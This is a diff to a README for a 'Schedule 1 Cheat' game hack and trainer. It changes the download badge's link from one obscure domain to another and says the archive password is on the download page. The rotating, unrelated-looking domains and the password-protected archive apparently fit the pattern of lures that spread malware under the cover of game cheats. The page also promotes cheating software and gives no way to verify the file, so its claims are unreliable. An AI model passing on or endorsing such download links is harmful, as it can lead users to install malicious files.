@@ -18,7 +18,7 @@ Schedule 1 Cheat - game hack and trainer with full feature set. Works with the l
 
 ## Download
 
-[![Download v1.1.0](https://img.shields.io/badge/Download_v1.1.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/schedule1cheat)
+[![Download v1.1.0](https://img.shields.io/badge/Download_v1.1.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/schedule1cheat)
 
 > The archive password is shown on the download page.
 
